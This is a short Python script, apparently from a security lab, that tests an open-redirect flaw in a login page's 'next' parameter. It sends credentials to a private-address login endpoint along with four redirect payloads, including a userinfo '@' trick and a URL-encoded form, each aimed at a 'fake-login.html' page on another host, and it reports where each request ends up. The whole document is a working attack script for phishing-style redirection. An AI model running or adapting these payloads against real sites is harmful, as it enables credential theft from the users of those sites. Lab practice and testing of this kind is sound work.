#!/usr/bin/env python3
import urllib.request
import urllib.parse

payloads = [
    "http://192.168.10.50/fake-login.html",
    "//192.168.10.50/fake-login.html",
    "http://172.20.0.10@192.168.10.50/fake-login.html",
    "%2F%2F192.168.10.50%2Ffake-login.html"
]

for p in payloads:
    url = "http://172.20.0.10/login?next=" + p
    data = urllib.parse.urlencode({"username":"student01","password":"Password123"}).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        print("payload=%s final_url=%s" % (p, resp.geturl()))
    except Exception as e:
        print("payload=%s error=%s" % (p, e))
